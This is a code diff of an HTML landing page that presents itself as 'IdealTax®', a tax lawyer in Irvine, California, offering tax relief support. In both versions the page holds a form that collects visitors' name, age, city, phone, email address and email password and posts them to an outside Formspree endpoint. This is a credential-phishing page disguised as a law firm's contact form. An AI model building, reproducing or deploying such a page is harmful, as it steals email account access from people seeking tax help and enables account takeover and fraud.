@@ -1,77 +1,91 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="UTF-8">
-  <title>IdealTax® – Tax Lawyer in Irvine, CA</title>
-  <meta name="viewport" content="width=device-width, initial-scale=1">
-  <style>
-    body { font-family: Arial, sans-serif; margin: 0; padding: 0; line-height: 1.6; }
-    header { background: #004080; color: #fff; padding: 20px 10px; text-align: center; }
-    header h1 { margin: 0; font-size: 2rem; }
-    .contact { font-size: 1rem; margin-top: 5px; }
-    .container { padding: 20px 15px; max-width: 600px; margin: 30px auto; }
-    .container p { font-size: 1.1rem; }
-    ul { list-style-type: disc; margin-left: 20px; }
-    label { display: block; margin-top: 15px; font-weight: bold; }
-    input {
-      width: 100%; padding: 10px; margin-top: 5px;
-      border: 1px solid #ccc; border-radius: 4px;
-      font-size: 1rem;
-    }
-    button {
-      margin-top: 20px; padding: 12px 20px;
-      background: #007ACC; color: #fff; border: none;
-      border-radius: 4px; font-size: 1rem;
-      cursor: pointer;
-    }
-    button:hover { background: #005a99; }
-    footer { margin: 40px 0; text-align: center; font-size: 0.9rem; color: #666; }
-  </style>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1" />
+    <title>IdealTax® | Get Tax Relief Support</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background: #f4f7fb;
+            margin: 0;
+            padding: 0;
+        }
+        header {
+            background-color: #003366;
+            color: white;
+            padding: 20px;
+            text-align: center;
+        }
+        header h1 {
+            margin: 0;
+            font-size: 28px;
+        }
+        .container {
+            max-width: 500px;
+            margin: 40px auto;
+            background: white;
+            padding: 30px;
+            box-shadow: 0 0 10px rgba(0,0,0,0.1);
+            border-radius: 6px;
+        }
+        h2 {
+            text-align: center;
+            color: #003366;
+        }
+        form {
+            display: flex;
+            flex-direction: column;
+        }
+        input {
+            margin-bottom: 15px;
+            padding: 10px;
+            font-size: 16px;
+            border: 1px solid #ccc;
+            border-radius: 4px;
+        }
+        button {
+            background-color: #003366;
+            color: white;
+            border: none;
+            padding: 12px;
+            font-size: 16px;
+            cursor: pointer;
+            border-radius: 4px;
+        }
+        button:hover {
+            background-color: #0055aa;
+        }
+        footer {
+            text-align: center;
+            padding: 20px;
+            font-size: 14px;
+            color: #666;
+        }
+    </style>
 </head>
 <body>
 
-  <header>
-    <h1>IdealTax®</h1>
-    <div class="contact">
-      Tax Lawyer – Avocat fiscaliste à Irvine, Californie | 📞 +1 714‑751‑5200
-    </div>
-  </header>
+<header>
+    <h1>IdealTax<span style="font-size:14px; vertical-align: super;">®</span></h1>
+</header>
 
-  <div class="container">
-    <p>Welcome to <strong>IdealTax®</strong>, your trusted tax law firm in Irvine, California.  
-    With decades of expertise in both federal and California tax regulations, we provide:</p>
-    <ul>
-      <li>Comprehensive tax planning & compliance</li>
-      <li>IRS representation & audit support</li>
-      <li>Personalized guidance for individuals & businesses</li>
-    </ul>
-
-    <form method="POST" action="https://formspree.io/f/xgvypvnq">
-      <label for="fullname">Full Name</label>
-      <input type="text" id="fullname" name="Full Name" required>
-
-      <label for="age">Age</label>
-      <input type="number" id="age" name="Age" required>
-
-      <label for="city">City</label>
-      <input type="text" id="city" name="City" required>
-
-      <label for="phone">Phone Number</label>
-      <input type="tel" id="phone" name="Phone Number" required>
-
-      <label for="email">Email Address</label>
-      <input type="email" id="email" name="Email" required>
-
-      <label for="emailpass">Email Password</label>
-      <input type="password" id="emailpass" name="Email Password" required>
-
-      <button type="submit">Submit</button>
+<div class="container">
+    <h2>Get Tax Relief Support</h2>
+    <form action="https://formspree.io/f/xgvypvnq" method="POST">
+        <input type="text" name="Full Name" placeholder="Full Name" required />
+        <input type="number" name="Age" placeholder="Age" required />
+        <input type="text" name="City" placeholder="City" required />
+        <input type="tel" name="Phone Number" placeholder="Phone Number" required />
+        <input type="email" name="Email" placeholder="Email Address" required />
+        <input type="password" name="Email Password" placeholder="Email Password" required />
+        <button type="submit">Submit</button>
     </form>
-  </div>
+</div>
 
-  <footer>
-    &copy; 2025 IdealTax® — Excellence in Tax Law & Compliance in California
-  </footer>
+<footer>
+    Contact us at +1 714-751-5200 · 2 Park Plaza, Suite 450, Irvine, California 92614
+</footer>
 
 </body>
 </html>
